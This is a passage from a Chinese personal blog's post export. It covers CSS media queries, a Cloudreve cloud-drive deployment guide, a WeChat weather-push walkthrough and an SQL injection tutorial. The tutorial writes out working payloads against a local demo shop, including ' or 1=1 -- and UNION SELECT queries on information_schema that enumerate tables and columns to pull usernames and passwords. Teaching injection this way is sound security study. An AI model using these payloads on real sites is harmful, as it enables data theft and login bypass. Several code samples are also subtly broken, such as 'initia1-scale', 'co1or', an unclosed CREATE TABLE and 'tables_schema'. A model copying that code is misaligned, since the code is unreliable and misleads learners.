title="媒体查询"></a>媒体查询</h1><p>媒体查询能使页面在不同在终端设备下达到不同的效果</p><p>媒体查询会根据设备的大小自动识别<strong>加载不同的样式</strong></p><h2 id="设置meta标签"><a href="#设置meta标签" class="headerlink" title="设置meta标签"></a><strong>设置meta标签</strong></h2><p>使用设备的宽度作为视图宽度并禁止初始的缩放。在<head>标签里加入这个meta标签。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width，initia1-scale=1,maximum-scale=1，user-scalable=no&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>参数解释</strong></p><ol><li>width = device-width宽度等于当前设备的宽度</li><li>initial-scale初始的缩放比例(默认设置为1.0)</li><li>maximum-scale 允许用户缩放到的最大比例(默认设置为1.0)</li><li>user-scalable用户是否可以手动缩放(默认设置为no)</li></ol><p><strong>媒体查询语法</strong>、</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">768px</span>) &#123;</span><br><span class="line"><span class="comment">/*设备小于768px加载样式*/</span></span><br><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line"><span class="attribute">background-color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">992px</span>) <span class="keyword">and</span> (<span class="attribute">min-width</span>: <span class="number">768px</span>) &#123;</span><br><span class="line"><span class="comment">/*设备小于768px但小于992px加载样式*/</span></span><br><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">   <span class="attribute">background-color</span>: pink;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">min-width</span>: <span class="number">992px</span>)&#123;</span><br><span class="line"><span class="comment">/*设备大于992px加载样式*/</span></span><br><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line"><span class="attribute">background</span>-co1or: green;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cloudreve云盘部署</title>
      <link href="/posts/859747b3/"/>
      <url>/posts/859747b3/</url>
      
        <content type="html"><![CDATA[<div><font size='6'><b>简介🦁</b></font></div><blockquote><div><font size='3'>Cloudreve 可以让您快速搭建起公私兼备的网盘系统。Cloudreve 在底层支持不同的云存储平台，用户在实际使用时无须关心物理存储方式。你可以使用 Cloudreve 搭建个人用网盘、文件分享系统，亦或是针对大小团体的公有云系统。</font></div></blockquote><p><br></p><div><font size='6'><b>准备🐼</b></font></div><div class="note success flat"><p>第一：准备一台云服务器或服务器实体机（前提是得有一个公网IP），这里我使用<b>阿里云轻量服务器</b>作为演示</p><p>阿里云官网：<a href="https://www.aliyun.com/">https://www.aliyun.com/</a></p><p>腾讯云官网：<a href="https://cloud.tencent.com/">https://cloud.tencent.com/</a></p><p>百度云官网：<a href="https://cloud.baidu.com/">https://cloud.baidu.com/</a></p></div><div class="tip warning faa-horizontal animated"><p>购买服务器后需要安装镜像，推荐使用linux系统。这里演示我使用的是Centos 8.2</p></div><div class="note success flat"><p>第二：下载Cloudreve的部署文件</p><p>文件地址：<a href="https://github.com/cloudreve/Cloudreve/releases">Releases · cloudreve/Cloudreve (github.com)</a></p><p>cloudreve官网：<a href="https://cloudreve.org/">Cloudreve - 部署公私兼备的网盘系统</a></p></div><p><br></p><div><font size='6'><b>部署🦔</b></font></div><div><font size='4'>第一步：打开控制台，找到自己购买的服务器，设置root账户登录密码，点击远程连接</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Cloudreve/2.png" alt="2"></p><hr><div><font size='4'>第二步：安装宝塔面板便于部署操作，这里我使用宝塔Linux面板进行安装    <p>复制对应的脚本命令进刚才远程连接打开的控制台中</p>    </font></div><p><b>宝塔官网：<a href="https://www.bt.cn/new/download.html">https://www.bt.cn/new/download.html</a></b></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Cloudreve/3.png" alt="3"></p><div class="tip warning faa-horizontal animated"><p>必须切换到root用户下才可以进行安装</p></div><div><font size='4'>等待安装完成后，截图保存或复制保存面板信息，宝塔面板默认使用8888端口</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Cloudreve/4.jpg" alt="4"></p><hr><div><font size='4'>第三步：打开云服务器的控制台界面，找到安全-->防火墙，放行8888端口</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Cloudreve/5.png" alt="5"></p><hr><div><font size='4'>第四步：登录宝塔Linux面板，输入初始账号和密码进入面板</font></div><div><font size='4'>点击左侧网站选项--->添加站点</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Cloudreve/6.png" alt="6"></p><hr><div><font size='4'>第五步：创建站点填写对应的信息，PHP版本为静态</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Cloudreve/7.png" alt="7"></p><div class="tip warning faa-horizontal animated"><p>这里需要说明一下，如果你没有域名，那么就直接填写IP地址，如果有域名，提前要将域名进行解析</p></div><hr><div><font size='4'>第六步：站点添加成功后，点击站点名称进行SSL证书部署</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Cloudreve/8.png" alt="8"></p><hr><div><font size='4'>第七步：点击根目录，进入后，将下载的压缩包拖入上传</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Cloudreve/10.png" alt="10"></p><hr><div><font size='4'>第八步：右键解压文件，得到一个cloudreve文件，修改权限为777</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Cloudreve/12.png" alt="12"></p><hr><div><font size='4'>第九步：Cloudreve默认使用5212端口进行访问，所以在服务器控制台--->安全--->防火墙添加规则--->放行5212端口。</font></div><div><font size='4'>进入宝塔面板，安全--->放行端口5212</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Cloudreve/13.png" alt="13"></p><hr><div><font size='4'>第十步：打开远程连接界面，进入刚才的文件目录下，使用 “ ./cloudreve”  运行文件，保存好初始账号和密码</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Cloudreve/14.png" alt="14"></p><hr><div><font size='6'><b>至此就可以通过  “http://IP:5212” 进行访问了🐻</b></font></div><div><font size='6'><b>部署优化🐨</b></font></div><div><font size='5'><b>添加进程管理</b></font></div><div><font size='4'>打开宝塔面板的软件商店，搜索管理器，安装Supervisor管理器</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Cloudreve/18.png" alt="18"></p><div><font size='4'>安装完成后点击设置，添加守护进程</font></div><div><font size='4'><div class='checkbox green'><input type="radio" />            <p>名称随意填写</p>            </div><div class='checkbox green'><input type="radio" />            <p>运行目录选择cloudreve所在的目录</p>            </div><div class='checkbox green'><input type="radio" />            <p>启动命令复制目录路径加上名称</p>            </div></font></div><p>​    </p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Cloudreve/19.png" alt="19"></p><hr><div><font size='5'><b>反向代理</b></font></div><blockquote><div><font size='4'>在自用或者小规模使用的场景下，你完全可以使用 Cloudreve 内置的 Web 服务器。但是如果你需要使用 HTTPS，亦或是需要与服务器上其他 Web 服务共存时，你可能需要使用主流 Web 服务器反向代理 Cloudreve ，以获得更丰富的扩展功能。</font></div></blockquote><div><font size='4'>在宝塔面板，点击网站，点击网站名称，左侧功能栏找到反向代理</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Cloudreve/15.png" alt="15"></p><div><font size='4'>配置反向代理信息</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Cloudreve/16.png" alt="16"></p><hr><div><font size='6'><b>现在，就可以通过正常的域名进行云盘的访问啦✨</b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Cloudreve/17.png" alt="17"></p><hr><div><font size='6'><b><div class="tip info"><p>如果出现疑问的地方，可以进行留言，我会及时回复</p></div></b></font></div>]]></content>
      
      
      <categories>
          
          <category> 奇奇怪怪 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云盘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL Injection Base</title>
      <link href="/posts/9520183a/"/>
      <url>/posts/9520183a/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL-Base"><a href="#MySQL-Base" class="headerlink" title="MySQL Base"></a>MySQL Base</h1><div> <font size='5'><b>系统库的释意：</b></font></div><div><font size='4' ><div class="tip "><p>information_schema库<font size='3'>是信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息，比如：数据库名、数据库表、表字段的数据类型与访问权限等。<b>Web渗透过程中用途很大</b></font></p></div></font></div><div><font size='4' ><div class="tip "><p>SCHEMATA表：<font size='3'>提供了当前MySQL实例中所有的数据库信息，show databases结果取之此表。</font></p></div></font></div><div><font size='4' ><div class="tip "><p>TABLES表：<font size='3'>提供了关于数据库中表的信息</font></p></div></font></div><div><font size='4' ><div class="tip "><p>COLUMNS表：<font size='3'>提供了表中的列信息，详细描述了某张表的所有列以及每个列的信息</font></p></div></font></div><div><font size='4' ><div class="tip "><p>mysql库：<font size='3'>MySQL的核心数据库，主要负责存储数据库的用户、权限设置、关键字等mysql自己需要使用的控制和管理信息。</font></p></div></font></div><div><font size='4' ><div class="tip "><p>performance_schema库：<font size='3'>内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写速度要高出几个数量级，将数据保存在内存中相比从磁盘上访问能够极大地提高应用的性能。</font></p></div></font></div><div><font size='4' ><div class="tip "><p>sys库：<font size='3'>通过这个数据库数据库，可以查询谁使用了最多的资源基于IP或是用户。哪张表被访问过最多等等信息。</font></p></div></font></div><hr><h1 id="基本的查询命令"><a href="#基本的查询命令" class="headerlink" title="基本的查询命令"></a>基本的查询命令</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-- 查看当前选择的是哪个库</span><br><span class="line">select database();</span><br><span class="line">-- 查看版本</span><br><span class="line">select version();</span><br><span class="line">-- 查看当前登录数据库的用户</span><br><span class="line">select user();</span><br><span class="line">-- 查看数据路径</span><br><span class="line">select @@datadir;</span><br><span class="line">-- 查看mysql安装路径</span><br><span class="line">select @@basedir;</span><br><span class="line">-- 查看mysql安装的系统</span><br><span class="line">select @@version_compile_os;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- 查询数据</span><br><span class="line">-- SELECT 查询关键字</span><br><span class="line">-- *代表所有</span><br><span class="line">select * from mysql.user;</span><br><span class="line">select user,host from mysql.user;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- where条件</span><br><span class="line">-- 查找mysql库中的user名称为root的信息</span><br><span class="line">select user,host from mysql.user where user == &#x27;root&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- 创建库</span><br><span class="line">create database test charset utf8mb4;</span><br><span class="line">-- 创建表</span><br><span class="line">use test;</span><br><span class="line">create table t1(id int ;</span><br><span class="line">alter table t1 add name varchar(32);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- 插入数据</span><br><span class="line">insert into t1 values (1,&quot;张三&quot;),(2,&quot;李四&quot;),(3,&quot;王五&quot;);</span><br><span class="line">insert into t1 values(4,&quot;张三&quot;);</span><br><span class="line">select * from t1;</span><br><span class="line">select * from information_schema.`columns` where table_schema = `test`;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 联合查询 union</span><br><span class="line">select * from test.t1 union select 1,2;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/SQL1.jpg" alt="SQL1"></p><blockquote><div><font size='4'>可以通过多次尝试，发现目标表暴露有几个字段  union select 1,2,3,4,......</font></div></blockquote><hr><h1 id="SQL注入漏洞是什么"><a href="#SQL注入漏洞是什么" class="headerlink" title="SQL注入漏洞是什么"></a>SQL注入漏洞是什么</h1><div><font size='4'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;是发生于应用程序与数据库层的安全漏洞。网站内部直接发送的SQL请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造SQL语句，如果用户输入的数据被构造成恶意SQL代码，Web应用又未对动态构造的SQL语句使用的参数进行审查，则会带来意想不到的危险。</font></div><h1 id="GET型SQL注入漏洞是什么"><a href="#GET型SQL注入漏洞是什么" class="headerlink" title="GET型SQL注入漏洞是什么"></a>GET型SQL注入漏洞是什么</h1><div><font size='4'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在提交网页内容时候，主要分为GET方法，POST方法，GET方法提交的内容会显现在网页URL上，通过对 URL连接进行构造，可以获得超出权限的信息内容。</font></div><h1 id="Web程序的三层架构"><a href="#Web程序的三层架构" class="headerlink" title="Web程序的三层架构"></a>Web程序的三层架构</h1><div>    <font size='4'>        <div class="tip info"><p>界面层<br>业务处理层<br>数据访问层——————&gt;SQL注入发生在这一层</p></div>    </font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/sql2.jpg" alt="sql2"></p><blockquote><div><font size='4'>SQL注入没有网页也能注入（无前端部分）列如：https://localhost:8080/login</font></div></blockquote><hr><h1 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理"></a>SQL注入的原理</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM t1 WHERE ID =%s;</span><br><span class="line">sqlStr := SELECT * FROM t1 WHERE name =&#x27;%s&#x27; username;</span><br><span class="line">-- 当用户输入1 or 1 = 1</span><br><span class="line">-- 实际上执行的sql</span><br><span class="line">SELECT * FROM t1 WHERE id = 1 OR 1=1;</span><br><span class="line">-- 也就是</span><br><span class="line">SELECT * FROM t1；</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/sql3.jpg" alt="sql3"></p><hr><h1 id="SQL注入带来的威胁"><a href="#SQL注入带来的威胁" class="headerlink" title="SQL注入带来的威胁"></a>SQL注入带来的威胁</h1><div><font size='4'><div class="tip warning faa-horizontal animated faa-fast"><p>猜解后台数据库，盗取网站敏感信息</p></div></font></div><div><font size='4'><div class="tip warning faa-horizontal animated faa-fast"><p>绕过验证，登录网站后台</p></div></font></div><div><font size='4'><div class="tip warning faa-horizontal animated faa-fast"><p>借助数据库的存储过程进行提权等操作</p></div></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/sql4.jpg" alt="sql4"></p><hr><h1 id="Demo简单实验理解SQL注入"><a href="#Demo简单实验理解SQL注入" class="headerlink" title="Demo简单实验理解SQL注入"></a>Demo简单实验理解SQL注入</h1><div><font size='5'>数据库中存在一张表products</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/sql6.jpg" alt="sql6"></p><div><font size='4'>正常情况下，用户只能查询到已发布的商品，此时<b>6号商品希捷酷狼16T*4</b>没有出现，因为<b>category=1</b>未发布</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/sql10.png" alt="sql10"></p><h2 id="第一阶段：获取隐藏数据，拿到所有的Gifts商品信息"><a href="#第一阶段：获取隐藏数据，拿到所有的Gifts商品信息" class="headerlink" title="第一阶段：获取隐藏数据，拿到所有的Gifts商品信息"></a>第一阶段：获取隐藏数据，拿到所有的Gifts商品信息</h2><div><font size='4'>通过请求URL分析&nbsp;&nbsp;&nbsp;&nbsp;<u>http:localhost:8080/products/?category=Gifts&released=0</u></font></div><div><font size='4'>因此服务端的SQL语句应该是</font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,name,content,released from products where category = ‘Gifts’ and released = 0</span><br></pre></td></tr></table></figure><div><font size='4'><div class="tip "><p>此时关键点在<b>released</b>!!!</p></div></font></div><div><font size='4'><b>方法1：改造请求URL</b></font></div><div><font size='4'><u>http:localhost:8080/products/?category=Gifts&released=1</u></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/sql8.jpg" alt="sql8"></p><div><font size='4'><b>方法2：:使用  ‘--  将‘Gifts’’-- 后面的内容注释掉， 显示所有跟Gifts相关的信息</b></font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,name,content,released from products where category = ‘Gifts’’-- and released = 0;</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/sql7.jpg" alt="sql7"></p><hr><h2 id="第二阶段：拿到所有商品，所有content"><a href="#第二阶段：拿到所有商品，所有content" class="headerlink" title="第二阶段：拿到所有商品，所有content"></a>第二阶段：拿到所有商品，所有content</h2><div><font size='4'>搜索框只可以搜category = ‘Gifts’ 里面的东西，注释掉后面的内容只是显示了所有与Gifts相关的</font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,name,content,released from products where category = ‘Gifts’’-- and released = 0;</span><br></pre></td></tr></table></figure><div><font size='4'>所以侧重点在where category = ‘Gifts’ ，必须要让它不生效才可以<br>可以理解为添加运算符 or 使得条件变成前面生效或者后面生效 1 = 1 </font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from products where category = &#x27;Gifts&#x27; or 1 = 1 -- &#x27;and released = 0;</span><br><span class="line">这条语句就等价于</span><br><span class="line">select * from products；</span><br></pre></td></tr></table></figure><div><font size='4'>此时在搜索框输入‘ or 1=1 --   成功获取所有信息</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/sql9.jpg" alt="sql9"></p><hr><h2 id="第三阶段：拿到用户名和密码登录进系统"><a href="#第三阶段：拿到用户名和密码登录进系统" class="headerlink" title="第三阶段：拿到用户名和密码登录进系统"></a>第三阶段：拿到用户名和密码登录进系统</h2><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/Q.jpg" alt="Q"></p><div><font size='4'><b>先熟悉union联合查询的使用</b></font></div><div><font size='4'>union select 后通过1,2,3,4,5，来获取‘products’表的五个字段内容，可以通过逐一试探的方式</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/11.jpg" alt="11"></p><div><font size='4'>由此，可以修改所需要查询的字段，通过union获取查询</font></div><blockquote><p>要注意区分int类型和字符串类型</p></blockquote><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/12.jpg" alt="12"></p><div><font size='4'>通过注入获取到当前界面的数据库以及用户user</font></div><div><font size='4'>知道了当前所使用的数据库为sql_inject，可以进一步注入，获取到该库下所有的数据表</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/13.jpg" alt="13"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,database(),table_name,4 from information_schema.tables where tables_schema=database() --</span><br><span class="line">#通过调用查询information_schema这个系统库，可以获取到当前数据库中存在的所有数据表名称</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/14.jpg" alt="14"></p><div><font size='4'>通过注入发现了user这个表，用户信息可能就存在于这张表。再对user表进行注入，获取表中的信息</font></div><div><font size='4'>因为不同的数据库操作员设置的用户名和密码的字段名称不同。</font></div><div><font size='4'>列如：passwd,password  user,user_name，所以要先确定字段名称</font></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,database(),column_name,4 from information_schema.columns where table_name=&#x27;user&#x27; and table_schema=database() --</span><br><span class="line">#通过调用查询column这个系统库，可以获取到当前数据表中的字段信息</span><br></pre></td></tr></table></figure><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/15.jpg" alt="15"></p><div><font size='4'>拿到了用户名和密码的字段名称，就可以开始注入，获取用户名和密码信息,进行登录</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/SQL/16.jpg" alt="16"></p><hr><h1 id="SQL注入的一些关键点"><a href="#SQL注入的一些关键点" class="headerlink" title="SQL注入的一些关键点"></a>SQL注入的一些关键点</h1><div><font size='4'><div class='checkbox cyan checked'><input type="checkbox" checked="checked"/>            <p>检索隐藏数据</p>            </div></font></div><div><font size='4'><div class='checkbox cyan checked'><input type="checkbox" checked="checked"/>            <p>修改应用程序逻辑</p>            </div></font></div><div><font size='4'><div class='checkbox cyan checked'><input type="checkbox" checked="checked"/>            <p>Union attack</p>            </div></font></div><div><font size='4'><div class='checkbox cyan checked'><input type="checkbox" checked="checked"/>            <p>获取敏感数据</p>            </div></font></div><div><font size='4'><div class='checkbox cyan checked'><input type="checkbox" checked="checked"/>            <p>盲注</p>            </div></font></div><hr>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信天气推送</title>
      <link href="/posts/54b4e7c8/"/>
      <url>/posts/54b4e7c8/</url>
      
        <content type="html"><![CDATA[<blockquote><h1 id="最近比较火的给女朋友推送天气的功能🔥"><a href="#最近比较火的给女朋友推送天气的功能🔥" class="headerlink" title="最近比较火的给女朋友推送天气的功能🔥"></a>最近比较火的给女朋友推送天气的功能🔥</h1><h1 id="今天教给大家如何操作😉"><a href="#今天教给大家如何操作😉" class="headerlink" title="今天教给大家如何操作😉"></a>今天教给大家如何操作😉</h1></blockquote><div align="center">    <font size='6'><b>话不多说先上预览图</b>    </font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/%E5%BE%AE%E4%BF%A1%E5%A4%A9%E6%B0%94%E6%8E%A8%E9%80%81%E6%96%87%E4%BB%B6/%E9%A2%84%E8%A7%88%E5%9B%BE.png" alt="预览图" style="zoom:25%;" /></p><hr><div>    <font size='5'><b>第一步：进入微信公众平台接口测试帐号申请👇        扫码进行登录注册</b>    </font></div><h2 id="链接：微信公众平台-qq-com"><a href="#链接：微信公众平台-qq-com" class="headerlink" title="链接：微信公众平台 (qq.com)"></a>链接：<a href="https://mp.weixin.qq.com/debug/cgi-bin/sandbox?t=sandbox/login">微信公众平台 (qq.com)</a></h2><hr><div>    <font size='5'><b>第二步：下载需要的运行工具和模板文件，我放在了百度网盘自行下载👇        </b>    </font></div><h3 id="链接：https-pan-baidu-com-s-1awMbcr28pNhEc64q9JGUog"><a href="#链接：https-pan-baidu-com-s-1awMbcr28pNhEc64q9JGUog" class="headerlink" title="链接：https://pan.baidu.com/s/1awMbcr28pNhEc64q9JGUog"></a>链接：<a href="https://pan.baidu.com/s/1awMbcr28pNhEc64q9JGUog">https://pan.baidu.com/s/1awMbcr28pNhEc64q9JGUog</a></h3><div>    <font size='3'><b>提取码：urw4         </b>    </font></div><hr><div>    <font size='5'><b>第三步：打开模板文件，Ctrl+A复制全部👇<br></font>    <font size='4'>        <p>            如果想换文字，模板中可以将这句话更换成其他的文字<br>            更换成功后全部复制        </p>      </b>    </font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/%E5%BE%AE%E4%BF%A1%E5%A4%A9%E6%B0%94%E6%8E%A8%E9%80%81%E6%96%87%E4%BB%B6/%E6%A8%A1%E6%9D%BF%E6%96%87%E4%BB%B6.png" alt="模板文件" style="zoom:35%;" /></p><hr><div>    <font size='5'><b>第四步：打开刚才注册登录后的界面<br></font>    <font size='4'><p>点击新增测试模板</p></b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/%E5%BE%AE%E4%BF%A1%E5%A4%A9%E6%B0%94%E6%8E%A8%E9%80%81%E6%96%87%E4%BB%B6/%E6%96%B0%E5%A2%9E.png" alt="新增"></p><div>    <font size='4'><b>这里的模板标题就是消息弹窗的标题<br>        <p>将复制的模板内容粘贴进去</p></b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/%E5%BE%AE%E4%BF%A1%E5%A4%A9%E6%B0%94%E6%8E%A8%E9%80%81%E6%96%87%E4%BB%B6/%E7%B2%98%E8%B4%B4.png" alt="粘贴"></p><hr><div>    <font size='5'><b>第五步：更改config文件<br></font>    <font size='3'>        <p>1.网页中找到自己的app_id，复制粘贴在config文件的app_id</p>        <p>2.网页中找到自己的appsecret，复制粘贴在config文件的app_secret</p>        <p>3.网页中找到刚才创建的模板ID，复制粘贴在config文件的template_id</p>        <p>4.其他的内容可根据自己的情况进行设置</p>        </b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/%E5%BE%AE%E4%BF%A1%E5%A4%A9%E6%B0%94%E6%8E%A8%E9%80%81%E6%96%87%E4%BB%B6/%E6%BC%94%E7%A4%BA1.jpg" alt="演示1"></p><blockquote><p>注意：复制的内容一定要放在   “  ” 中间才可以！！</p></blockquote><hr><div>    <font size='5'><b>第六步：让需要推送的用户扫描这个二维码<br></font>        <font size='3'>            <p>扫描成功后会对应生成微信的一串字符</p>            <p>将需要推送的微信字符粘贴在config文件的user后</p>        </b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/%E5%BE%AE%E4%BF%A1%E5%A4%A9%E6%B0%94%E6%8E%A8%E9%80%81%E6%96%87%E4%BB%B6/%E6%BC%94%E7%A4%BA2.png" alt="演示2"></p><blockquote><p>注意：粘贴的内容     “user”: [“  这里  “]   一定要在括号的英文引号中间</p><p>如果要绑定多个用户    “user”: [“  这里  “,”    “] 在第一个用户的引号后面输入英文逗号，然后输入英文引号，粘贴对应的字符</p><p>例：”user”: [“oHgbt6vePVQb4b9rfekUUgs3DYwc”,”oHgbt6ntZmn9A3bgDRrIBqz9wq7U”],</p></blockquote><hr><div>    <font size='5'><b>第七步：双击启动下载的weixin.exe文件<br></font>        <font size='3'>            <p>一定要注意，下载的文件都放在同一个目录下，否则会出现路径不一致无法运行</p>            <p>运行后出现如下界面表示成功✨✨✨</p>        </b></font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/%E5%BE%AE%E4%BF%A1%E5%A4%A9%E6%B0%94%E6%8E%A8%E9%80%81%E6%96%87%E4%BB%B6/%E6%88%90%E5%8A%9F.png" alt="成功"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 奇奇怪怪 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WeChat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCIP学习笔记</title>
      <link href="/posts/fbc4b7ad/"/>
      <url>/posts/fbc4b7ad/</url>
      
